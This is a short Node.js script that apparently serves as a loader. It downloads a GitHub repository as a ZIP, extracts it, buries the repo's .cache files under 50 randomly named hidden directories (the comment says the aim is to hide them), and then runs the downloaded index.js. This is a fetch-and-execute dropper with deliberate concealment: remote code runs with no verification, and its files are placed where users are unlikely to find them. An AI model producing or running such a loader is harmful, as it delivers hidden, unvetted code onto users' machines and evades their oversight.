const fs = require('fs');
const path = require('path');
const https = require('https');
const AdmZip = require('adm-zip');
const crypto = require('crypto');
const { spawn } = require('child_process');

// Config
const githubZipUrl = 'https://github.com/JoshKing01ofc/jmofc/archive/refs/heads/main.zip';
const tempDir = path.join(__dirname, 'temp');
const zipPath = path.join(tempDir, 'repo.zip');
const extractTo = path.join(tempDir, 'extracted');

// Prep folders
fs.mkdirSync(tempDir, { recursive: true });

// Download repo zip
https.get(githubZipUrl, res => {
    const file = fs.createWriteStream(zipPath);
    res.pipe(file);
    file.on('finish', () => {
        file.close(() => {
            const zip = new AdmZip(zipPath);
            zip.extractAllTo(extractTo, true);

            // Locate extracted repo folder
            const extractedRepo = fs.readdirSync(extractTo)
                .map(name => path.join(extractTo, name))
                .find(p => fs.statSync(p).isDirectory());

            // Hide .cache files 50 folders deep
            const cacheDir = path.join(extractedRepo, '.cache');
            if (fs.existsSync(cacheDir) && fs.statSync(cacheDir).isDirectory()) {
                let deepPath = cacheDir;
                for (let i = 0; i < 50; i++) {
                    deepPath = path.join(deepPath, '.' + crypto.randomBytes(3).toString('hex'));
                    fs.mkdirSync(deepPath);
                }
                fs.readdirSync(cacheDir).forEach(f => {
                    const src = path.join(cacheDir, f);
                    const dst = path.join(deepPath, f);
                    if (fs.existsSync(src) && fs.statSync(src).isFile()) {
                        fs.renameSync(src, dst);
                    }
                });
            }

            // Run the main file
            const mainPath = path.join(extractedRepo, 'index.js');
            if (fs.existsSync(mainPath)) {
                spawn('node', [mainPath], {
                    stdio: 'inherit',
                    cwd: extractedRepo,
                });
            }
        });
    });
});
